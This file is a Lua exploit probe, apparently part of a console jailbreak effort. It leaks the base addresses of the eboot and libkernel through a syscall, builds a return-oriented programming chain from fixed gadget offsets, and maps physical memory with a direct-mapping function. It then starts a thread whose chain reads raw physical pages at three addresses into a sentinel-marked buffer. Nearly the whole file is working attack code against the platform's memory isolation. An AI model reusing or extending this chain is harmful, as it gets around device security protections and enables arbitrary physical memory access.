-- CRASH_CLASS: MODERATE
-- PROBE 562b: Physical memory read with robust double-sentinel extraction
--
-- 562a proved: child thread ROP chain reads MapDM'd physical pages.
-- DEADFACE sentinel confirmed in output stream. But Lua print() is
-- killed by MapDM binary debug output.
--
-- Strategy: write results to shared buffer with unique delimiters,
-- extract from raw binary output on python side.
-- Buffer layout:
--   +0x00: 0xAABBCCDD (start marker lo)
--   +0x04: 0x11223344 (start marker hi)
--   +0x08: phys_lo
--   +0x0C: phys_hi
--   +0x10: qword[0] (8 bytes) ... qword[15] (8 bytes) = 128 bytes
--   +0x90: 0xDDCCBBAA (end marker lo)
--   +0x94: 0x44332211 (end marker hi)
--
-- Read 3 physical addresses:
--   A) 0x000000000 (GPU pool base)
--   B) 0x100000000 (4GB)
--   C) 0x180000000 (6GB)

print("=== PROBE 562b: PHYS READ ROBUST ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do wd(buf + off, 0) end
end

local Z = uint64(0)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc455 = mk(455)
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)
io.flush()

-- Eboot + libkernel
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", eb_hi, eb_lo, lk_hi, lk_lo))
io.flush()

-- Gadgets
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rax_ret     = eboot + uint64(0x992)
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4)
local mov_mem_rdi_rax = eboot + uint64(0x92C67)
local bare_ret        = eboot + uint64(0x42)

-- ============================================================
-- read_phys_to_buf: map + child read, results in shared buf
-- Returns shared buffer address (caller reads raw from output)
-- ============================================================
local mapped_va = uint64("0x880000000")

local function read_phys_to_buf(phys_hi, phys_lo)
    local phys = uint64(string.format("0x%X%08X", phys_hi, phys_lo))
    local nq = 16

    pcall(function()
        sc477(mapped_va, uint64(0x4000), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), Z)
    end)

    local ok_md, rv_md = pcall(function()
        return native.fcall_with_rax(mapdm_fn, 0,
            mapped_va, uint64(0x4000), uint64(3), Z, phys, uint64(0x4000))
    end)
    local md_rv = ok_md and N(rv_md) or -999

    -- Shared buffer: markers + phys addr + 16 qwords + end markers
    local shared = memory.alloc(0x200)
    zero(shared, 0x200)

    -- Pre-write start marker so it's there even if child fails
    wd(shared + 0x00, 0xAABBCCDD)   -- start lo
    wd(shared + 0x04, 0x11223344)   -- start hi
    wd(shared + 0x08, phys_lo)
    wd(shared + 0x0C, phys_hi)
    -- qwords go at +0x10 to +0x8F (16 * 8 = 128 bytes)
    -- end markers at +0x90
    wd(shared + 0x90, 0xDDCCBBAA)   -- end lo (written by child as sentinel)
    wd(shared + 0x94, 0x44332211)   -- end hi

    if md_rv ~= 0 then
        pcall(function() sc73(mapped_va, uint64(0x4000)) end)
        return nil
    end

    -- Stack + ROP chain
    local ss = 0x4000
    local ok_stk, sb = pcall(function()
        return sc477(Z, uint64(ss), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    if not ok_stk then
        pcall(function() sc73(mapped_va, uint64(0x4000)) end)
        return nil
    end

    local sb_n = N(sb)
    local rsp_n = (sb_n + ss) - ((sb_n + ss) % 16) - 8
    local rsp = sb + uint64(rsp_n - sb_n)

    local ci = 0
    local function wc(val) wq(rsp + uint64(ci * 8), val); ci = ci + 1 end

    -- Read 16 qwords from mapped page → shared+0x10
    for qi = 0, nq - 1 do
        wc(pop_rsi_ret)
        wc(mapped_va + uint64(qi * 8))
        wc(mov_rax_mem_rsi)
        wc(pop_rdi_ret)
        wc(shared + uint64(0x10 + qi * 8))
        wc(mov_mem_rdi_rax)
    end

    -- Overwrite end marker with DEADFACE as sentinel
    wc(pop_rax_ret)
    wc(uint64("0xDEADFACE"))
    wc(pop_rdi_ret)
    wc(shared + uint64(0x90))
    wc(mov_mem_rdi_rax)

    for i = 1, 32 do wc(bare_ret) end

    -- thr_param
    local pa = memory.alloc(0x40)
    zero(pa, 0x40)
    wq(pa + 0x00, bare_ret)
    wq(pa + 0x08, Z)
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8)
    wq(tid, Z)
    wq(pa + 0x30, uint64(tid))

    pcall(function() sc455(uint64(pa), uint64(0x38)) end)

    -- Wait for sentinel
    for wait = 1, 5000 do
        for j = 1, 200 do local x = j * j end
        local s = rb(shared + 0x90) or 0
        if s == 0xDEADFACE then break end
    end

    -- Cleanup mapped page and stack
    pcall(function() sc73(mapped_va, uint64(0x4000)) end)
    pcall(function() sc73(sb, uint64(ss)) end)

    return shared
end

-- ============================================================
-- Run 3 reads at different physical addresses
-- ============================================================
print("starting reads")
io.flush()

local addrs = {
    {0, 0x00000000},          -- 0GB (GPU pool)
    {1, 0x00000000},          -- 4GB
    {1, 0x80000000},          -- 6GB
}

for _, a in ipairs(addrs) do
    read_phys_to_buf(a[1], a[2])
end

-- After all MapDM/thread work, try to print
-- (may not appear due to binary debug corruption, that's OK)
print("")
print("=== 562b DONE ===")
local pid2 = N(sc20())
print("pid=" .. pid2)
